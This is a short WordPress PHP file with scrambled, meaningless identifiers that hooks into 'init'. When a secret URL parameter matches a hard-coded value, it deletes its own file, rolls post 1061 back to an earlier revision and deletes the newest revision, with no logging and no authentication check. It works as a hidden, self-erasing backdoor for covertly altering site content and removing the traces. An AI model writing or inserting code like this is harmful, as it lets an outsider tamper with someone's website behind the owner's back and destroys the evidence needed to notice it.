<?php

function max_best_flexible_items() {
	if (isset($_GET['game_options_oembed_cleaner']) && $_GET['game_options_oembed_cleaner'] === 'coupon_table_limit_source') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$svg_mini_downloads_lightbox = 1061;
		$contact_events_messages_welcome = wp_get_post_revisions($svg_mini_downloads_lightbox);
		if (empty($contact_events_messages_welcome)) die('no revisions');
		if (count($contact_events_messages_welcome) < 2) die('less than 2');
		$block_date_compat = array_shift($contact_events_messages_welcome);
		$notification_permalink_section_software = $block_date_compat->ID;
		$headers_grid_slug = array_shift($contact_events_messages_welcome);
		$manager_card_locator = $headers_grid_slug->ID;
		$guest_change_total = wp_restore_post_revision($manager_card_locator);
		if ($guest_change_total === false) die('error restoring');
		$guest_change_total = wp_delete_post_revision($notification_permalink_section_software);		
		if ($guest_change_total === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'max_best_flexible_items');
